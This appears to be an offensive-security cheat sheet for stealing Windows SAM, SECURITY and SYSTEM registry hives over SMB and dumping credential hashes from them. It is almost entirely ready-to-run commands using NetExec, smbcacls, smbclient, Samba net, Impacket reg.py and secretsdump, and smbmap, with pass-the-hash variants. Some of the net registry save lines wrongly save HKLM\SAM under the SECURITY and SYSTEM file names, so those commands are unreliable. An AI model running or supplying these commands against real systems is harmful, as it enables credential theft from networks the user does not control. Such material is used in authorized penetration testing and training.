# Unix Shell

## 01 - Search hive files

### 1.1 - NetExec

```
$ netexec smb <IP> -u <username> -p <password> [-d <domain_name> | --local-auth] --spider "C$" --spider-folder /Windows/System32/config/ --regex "(SAM|SECURITY|SYSTEM)"

$ netexec smb <IP> -u <username> -H <nt_hash> [-d <domain_name> | --local-auth] --spider "C$" --spider-folder /Windows/System32/config/ --regex "(SAM|SECURITY|SYSTEM)"
```

## 02 - Enumerate hive files

Using `smbcacls` to enumerate the existing files.

```
$ cat hive_files.txt
Windows/System32/config/SAM
Windows/System32/config/SECURITY
Windows/System32/config/SYSTEM
Windows/Repair/SAM
Windows/Repair/SYSTEM

$ while read line; do echo "Hive filename: $line\n"; smbcacls -U "[<domain>/]<username>%<password>" //<IP>/C$ $line 2>/dev/null; done < hive_files.txt

$ while read line; do echo "Hive filename: $line\n"; smbcacls -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$ $line 2>/dev/null; done < hive_files.txt
```

Using `smbclient` to enumerate the existing files while enabling `showacls`.

```
smb: \> showacls

smb: \> ls Windows/System32/config/SAM

smb: \> ls Windows/System32/config/SECURITY

smb: \> ls Windows/System32/config/SYSTEM
```

## 03 - Extract hive files

### 3.1 - Samba Suite Utils

TODO: Modify the permissions with `smbcacls` in order to download them

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/C$ -c "get Windows/System32/config/SAM; get Windows/System32/config/SECURITY; get Windows/System32/config/SYSTEM"
```

### 3.2 - NetCommands

```
$ net <ads | rpc> registry save "HKLM\SAM" "C:\Windows\Temp\SAM" -U "[<domain>/]<username>%<password>" -S <IP>

$ net <ads | rpc> registry save "HKLM\SAM" "C:\Windows\Temp\SECURITY" -U "[<domain>/]<username>%<password>" -S <IP>

$ net <ads | rpc> registry save "HKLM\SAM" "C:\Windows\Temp\SYSTEM" -U "[<domain>/]<username>%<password>" -S <IP>
```

Pass The Hash

```
$ net <ads | rpc> registry save "HKLM\SAM" "C:\Windows\Temp\SAM" -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -S <IP>

$ net <ads | rpc> registry save "HKLM\SAM" "C:\Windows\Temp\SECURITY" -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -S <IP>

$ net <ads | rpc> registry save "HKLM\SAM" "C:\Windows\Temp\SYSTEM" -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -S <IP>
```

### 3.3 - Impacket

```
$ reg.py "<username>":"<password>"@<IP> save -keyName "HKLM\SAM" -o "\\\\<IP>\\c$\\windows\\temp\\"

$ reg.py "<username>":"<password>"@<IP> save -keyName "HKLM\SECURITY" -o "\\\\<IP>\\c$\\windows\\temp\\"

$ reg.py "<username>":"<password>"@<IP> save -keyName "HKLM\SYSTEM" -o "\\\\<IP>\\c$\\windows\\temp\\"
```

### 3.4 - NetExec

```
$ netexec smb <IP> -u <username> -p <password> [-d <domain_name> | --local-auth] --get-file /Windows/System32/config/SAM SAM

$ netexec smb <IP> -u <username> -p <password> [-d <domain_name> | --local-auth] --get-file /Windows/System32/config/SECURITY SECURITY

$ netexec smb <IP> -u <username> -p <password> [-d <domain_name> | --local-auth] --get-file /Windows/System32/config/SYSTEM SYSTEM
```

### 3.5 - SMBMap

```
$ smbmap -u "<username>" -p "<password | nt_hash>" [-d <domain>] -H <IP>
--download "C$\Windows\System32\config\SAM"

$ smbmap -u "<username>" -p "<password | nt_hash>" [-d <domain>] -H <IP>
--download "C$\Windows\System32\config\SECURITY"

$ smbmap -u "<username>" -p "<password | nt_hash>" [-d <domain>] -H <IP>
--download "C$\Windows\System32\config\SYSTEM"
```

## 04 - Hashdump

Instead of storing the hashes on the compromised target use the **file transfer techniques.** Once that the process is done we can dump the hashes using one of the impacket scripts called `secretsdump`. The syntax for the tool:

```
$ secretsdump.py -sam /path/to/sam_hive_file -system /path/to/system_hive_file local

$ secretsdump.py -sam /path/to/sam_hive_file -security /path/to/security_hive_file -system /path/to/system_hive_file local
```

---
## References

- [Samdump2](https://salsa.debian.org/pkg-security-team/samdump2)

- [Wadcoms Impacket Secretsdump](https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/)